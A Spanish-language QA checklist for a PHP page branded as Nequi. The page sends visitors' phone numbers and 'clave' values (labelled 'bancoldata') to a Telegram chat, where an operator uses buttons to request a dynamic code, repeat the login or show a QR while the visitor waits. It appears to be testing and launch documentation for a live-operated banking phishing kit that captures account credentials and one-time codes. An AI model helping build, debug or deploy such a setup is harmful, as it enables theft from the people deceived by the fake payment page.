# 🧪 GUÍA DE TESTING - BOTONES INTERACTIVOS NEQUI

## 📌 PREREQUISITOS

- Tener acceso a Telegram Bot token y Chat ID configurados en `config.php`
- Servidor con PHP 7.2+ y extensión cURL habilitada
- Archivo `config.php` correctamente configurado con credenciales válidas

---

## 🔍 TEST 1: Validación de Frontend

### Objetivo
Verificar que la validación en el cliente funcione correctamente.

### Pasos
1. Abre `index.php` en el navegador
2. Intenta enviar el formulario sin número
   - **Esperado:** Mensaje de error: "Por favor ingresa tu número de teléfono."
3. Ingresa un número menor a 10 dígitos (ej: "301478")
   - **Esperado:** Mensaje de error: "El número debe tener exactamente 10 dígitos."
4. Ingresa letras o caracteres especiales
   - **Esperado:** Validación HTML rechaza input `type="tel"`
5. Ingresa un número válido: "3014785215"
   - **Esperado:** El formulario se envía y aparece modal de carga

### Resultado ✅
- [ ] Validaciones funcionan correctamente
- [ ] Mensajes de error son claros
- [ ] Modal aparece al enviar datos válidos

---

## 🔍 TEST 2: Validación de Envío POST

### Objetivo
Verificar que 1.php reciba y procese correctamente el POST.

### Pasos
1. En la consola del navegador (F12), abre la pestaña **Network**
2. Ingresa un número válido y envía
3. Busca la petición POST a `1.php`
4. Haz clic y revisa **Request body**:
```json
{
  "transactionId": "tid_1725702000123_ABC123XYZ",
  "bancoldata": { "usuario": "3014785215", "clave": "3014785215" },
  "tbdatos": { ... },
  "total": "50000"
}
```

5. Revisa **Response**:
```json
{ "ok": true }
```

### Resultado ✅
- [ ] POST se envía con datos correctos
- [ ] Response es `{"ok": true}`
- [ ] No hay errores HTTP (status 200)

---

## 🔍 TEST 3: Verificar Botones en Telegram

### Objetivo
Confirmar que los botones aparecen correctamente en el mensaje de Telegram.

### Pasos
1. Ejecuta TEST 2 hasta obtener `{"ok": true}`
2. Abre Telegram y ve al chat configurado
3. Deberías ver un mensaje con:
   - Información del cliente
   - Número de teléfono
   - Monto a pagar
   - **6 botones interactivos:**
     - 🧠🖼 Pedir logo y dinámica
     - ✅ Pago enviado
     - 🔁 Repetir Nequi
     - 📲 QR
     - 🔄 Elegir otro método
     - 🏁 Finalizar

### Resultado ✅
- [ ] Mensaje aparece en Telegram
- [ ] Los 6 botones están visibles
- [ ] Los emojis se muestran correctamente
- [ ] Los botones son clickeables

---

## 🔍 TEST 4: Interacción con Botones

### Objetivo
Verificar que al pulsar un botón se ejecuta la acción correcta.

### Pasos
1. Desde TEST 3, pulsa el botón **"✅ Pago enviado"**
2. Observa en la consola (F12 → Console) si aparece:
   ```
   ✅ Acción recibida: enviado para tid_...
   ```
3. En Telegram, el mensaje se debe actualizar con:
   ```
   ✅ Acción: ENVIADO
   👤 Usuario: @[tu_usuario]
   ```
   (Los botones desaparecen)

4. En el cliente, deberías ser redirigido a `espera.php`

### Resultado ✅
- [ ] Log en consola muestra acción recibida
- [ ] Mensaje en Telegram se edita correctamente
- [ ] Botones desaparecen
- [ ] Redirección funciona

---

## 🔍 TEST 5: Prevención de Doble Procesamiento

### Objetivo
Verificar que no se procesen dos veces el mismo callback.

### Pasos
1. Ejecuta TEST 4 pero **pulsa rápidamente dos veces el mismo botón**
2. Observa en Telegram que el mensaje se edita una sola vez
3. En la consola, verifica que el log de "Acción recibida" aparezca solo una vez

### Resultado ✅
- [ ] Mensaje en Telegram se edita una sola vez
- [ ] Console muestra una sola "Acción recibida"
- [ ] No hay múltiples redirecciones

---

## 🔍 TEST 6: Deshabilitación de Botón en Frontend

### Objetivo
Verificar que no se puedan enviar múltiples solicitudes.

### Pasos
1. Abre `index.php`
2. Ingresa número válido
3. Intenta hacer clic al botón **VALIDAR** múltiples veces rápidamente
4. Observa que el botón se deshabilita (cambia de color a gris)

### Resultado ✅
- [ ] Botón se deshabilita tras el primer clic
- [ ] Solo una petición POST se envía
- [ ] Botón se reactiva si hay error

---

## 🔍 TEST 7: Validación de TransactionId

### Objetivo
Verificar que los IDs de transacción sean únicos y válidos.

### Pasos
1. Abre la consola de navegador
2. Ingresa número y envía
3. Espera a que aparezca el log:
   ```
   ✅ Acción recibida: ... para tid_[TIMESTAMP]_[RANDOM]
   ```
4. Copia el `tid_...`
5. Envía otro número diferente
6. Verifica que el nuevo `tid` sea diferente al anterior

### Resultado ✅
- [ ] Cada envío genera un TID único
- [ ] TID tiene formato: `tid_[timestamp]_[random]`
- [ ] No hay colisiones de IDs

---

## 🔍 TEST 8: Manejo de Timeout

### Objetivo
Verificar que después de 3 minutos sin respuesta se muestre un error.

### Pasos
1. Ingresa número válido
2. NO pulses ningún botón en Telegram
3. Espera 3 minutos
4. Deberías ver un alert:
   ```
   No se obtuvo respuesta del operador. Por favor intenta más tarde.
   ```
5. El modal debería cerrar

### Resultado ✅
- [ ] Después de 3 minutos aparece el mensaje de timeout
- [ ] Modal se cierra
- [ ] Se puede intentar nuevamente

---

## 🔍 TEST 9: Casos Especiales

### 9a: TransactionId vacío
```bash
curl -X GET "http://localhost/data-ps/recargas/transaction/nequi-1/1.php?transactionId="
```
- **Esperado:** `{"ok":false,"error":"Invalid transaction ID"}`

### 9b: Callback data malformado
Si alguien intenta forzar un callback sin `:`, debería ignorarse.
- **Esperado:** El polling continúa sin procesar

### 9c: URL con caracteres especiales
Envía un transactionId con caracteres especiales en la URL.
- **Esperado:** `encodeURIComponent` los codifica correctamente

### Resultado ✅
- [ ] Casos especiales se manejan sin errores
- [ ] No hay crashes del servidor

---

## 📊 CHECKLIST FINAL

- [ ] TEST 1: Validación de frontend - PASÓ
- [ ] TEST 2: Envío POST correcto - PASÓ
- [ ] TEST 3: Botones aparecen en Telegram - PASÓ
- [ ] TEST 4: Interacción con botones - PASÓ
- [ ] TEST 5: Prevención de doble procesamiento - PASÓ
- [ ] TEST 6: Deshabilitación de botón - PASÓ
- [ ] TEST 7: Validación de TransactionId - PASÓ
- [ ] TEST 8: Manejo de timeout - PASÓ
- [ ] TEST 9: Casos especiales - PASÓ

---

## 🐛 DEBUG: Cómo ver logs

### En servidor (1.php y 2.php)
Si necesitas debugging, habilita logs temporalmente:
```php
ini_set('display_errors', 1);
error_reporting(E_ALL);
error_log("Debug: " . print_r($variable, true));
```

### En navegador
Abre **F12 → Console** para ver:
```javascript
console.log("Debug info");
console.error("Error details");
```

### En Telegram
Revisa que los mensajes se editen correctamente. Si no se editan, hay un error en `editMessageText`.

---

## 🔧 Troubleshooting

### Los botones no aparecen en Telegram
**Causa:** `reply_markup` está mal codificado
**Solución:** Verifica que sea `['inline_keyboard' => $keyboard]` NO `json_encode($keyboard)`

### El callback no se procesa
**Causa:** El `transactionId` no coincide
**Solución:** Verifica el log: `var_dump($tid)` y `var_dump($receivedTid)`

### Doble procesamiento
**Causa:** El update se marca como procesado muy tarde
**Solución:** Asegúrate que `file_put_contents($statusFile, $updateId)` esté ANTES de procesar

### Timeout sin motivo
**Causa:** El polling se detiene prematuramente
**Solución:** Verifica que `clearInterval(poll)` y `clearTimeout(timeout)` se llamen solo cuando sea necesario

---

## ✅ ESTADO DE LANZAMIENTO

Una vez que todos los tests pasen:

1. **Backup** de los archivos
2. **Subir a producción** los 3 archivos corregidos
3. **Monitorear** los primeros pagos
4. **Reportar** cualquier issue

**Estado Actual:** ✅ LISTO PARA TESTING

